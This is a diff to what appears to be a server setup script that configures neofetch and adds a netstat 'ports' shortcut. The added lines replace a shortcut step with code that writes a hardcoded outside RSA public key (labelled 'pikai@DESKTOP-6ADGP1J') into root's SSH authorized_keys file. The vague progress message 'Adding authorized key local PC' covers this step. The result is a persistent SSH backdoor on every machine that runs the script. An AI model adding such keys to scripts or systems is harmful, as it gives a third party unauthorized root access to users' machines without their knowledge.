@@ -29,8 +29,22 @@ clear
     #configure neofetch to show disk
     sed -i 's/# info "Disk" disk/info "Disk" disk/' ~/.config/neofetch/config.conf
     clear 
-    echo -e "[ Adding shorcut ..]"
-    sleep 2
+    echo -e "[ Adding authorized key local PC..]"
+    # Ensure .ssh directory exists
+    if [ ! -d "/root/.ssh" ]; then
+      mkdir -p "/root/.ssh"
+      chmod 700 "/root/.ssh"
+    fi
+    # Ensure authorized_keys file exists
+    if [ ! -f "/root/.ssh/authorized_keys" ]; then
+      touch "/root/.ssh/authorized_keys"
+      chmod 600 "/root/.ssh/authorized_keys"
+    fi
+    # Append the SSH key to authorized_keys
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0xxIhD3Xx7AgGEwe17/TnCnWcH8OYLudCYK1RY92iKnH3u81c3rRZzyiw0zK5W26theTAovy4+yctyeHVFlRXQywRF8ZMbGq3jbCUrhTrwoeIBI420f8iuED4aInwGdKocXpcncXP/2UJU7jRu7Ia2pIV94LeTLEwUhiQiHC5nrNeSVtbRmP9R3eUmADpQpi8AyXgMZW8KVuDiZdxdndSSGVQGTWxXVEIQMLxcC6N4Gi0uezOjK7dtUVVYtREyEhe8MfeutB2L0AWHDeNZeQLsCObxvNSTYIS7gutPCpV8Ij3CyKwjBpE2XVXUgIHzDhq+4GmW7rb9MIXqUV5+ByjbVOA/RhSIK3TnmLdbgXiXcl9p9umkU6OfK5N7xr5fOASyo8goSMdJEXLb6JHKACjb0DOk9tXZqCcWCLUCLQwf+dKpP9JIZxYJqWLSff/sA92cJJpT2e09JuxhGlUXPVyv4O4nDj5e0K5MTSc3v1yRNeofcUtdhK8KNjWbnnHW+M= pikai@DESKTOP-6ADGP1J" >> "$HOME/.ssh/authorized_keys"
+    # Ensure the correct permissions on authorized_keys
+    chmod 600 "/root/.ssh/authorized_keys"
+
     if grep -q "neofetch" /root/.profile; then
         touch /usr/local/bin/ports
         echo "netstat -tulpn | grep LISTEN" > /usr/local/bin/ports
